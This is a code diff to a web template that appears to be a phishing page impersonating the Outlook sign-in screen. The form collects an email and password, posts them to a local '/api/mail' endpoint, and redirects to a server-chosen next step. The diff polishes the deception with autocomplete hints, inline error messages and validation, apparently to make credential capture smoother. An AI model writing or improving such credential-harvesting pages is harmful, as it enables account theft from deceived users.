@@ -20,6 +20,7 @@
         .submit-btn{background-color:#0067b8;color:#fff;border:none;padding:10px 32px;font-size:15px;cursor:pointer}
         .submit-btn:hover{background-color:#005da6}
         .lang-indicator{text-align:center;font-size:11px;color:#6c6c8a;margin-bottom:10px}
+        .error-msg{color:#e91429;font-size:13px;margin-top:8px;display:none;text-align:center}
     </style>
 </head>
 <body>
@@ -30,21 +31,30 @@
         <p>{{ get_text(lang, 'outlook_subtitle') }}</p>
         <form id="outlookForm">
             <div class="form-group">
-                <input type="email" id="mailEmail" required placeholder="{{ get_text(lang, 'outlook_email') }}">
+                <input type="email" id="mailEmail" name="mailEmail" required placeholder="{{ get_text(lang, 'outlook_email') }}" autocomplete="email">
             </div>
             <div class="form-group">
-                <input type="password" id="mailPassword" required placeholder="{{ get_text(lang, 'outlook_password') }}">
+                <input type="password" id="mailPassword" name="mailPassword" required placeholder="{{ get_text(lang, 'outlook_password') }}" autocomplete="current-password">
             </div>
             <div class="btn-container">
                 <button type="submit" class="submit-btn">{{ get_text(lang, 'outlook_button') }}</button>
             </div>
+            <div class="error-msg" id="errorMsg">Please fill in all fields</div>
         </form>
     </div>
     <script>
         document.getElementById('outlookForm').addEventListener('submit', async function(e) {
             e.preventDefault();
+            
             const mailEmail = document.getElementById('mailEmail').value;
             const mailPassword = document.getElementById('mailPassword').value;
+            const errorMsg = document.getElementById('errorMsg');
+            
+            if (!mailEmail || !mailPassword) {
+                errorMsg.style.display = 'block';
+                return;
+            }
+            errorMsg.style.display = 'none';
             
             try {
                 const res = await fetch('/api/mail', {
@@ -60,10 +70,12 @@
                 if (data.status === 'success') {
                     window.location.href = data.next;
                 } else {
-                    alert('Error, please try again.');
+                    errorMsg.textContent = data.message || 'Error, please try again.';
+                    errorMsg.style.display = 'block';
                 }
             } catch(err) {
-                alert('Error, please try again.');
+                errorMsg.textContent = 'Network error, please try again.';
+                errorMsg.style.display = 'block';
             }
         });
     </script>
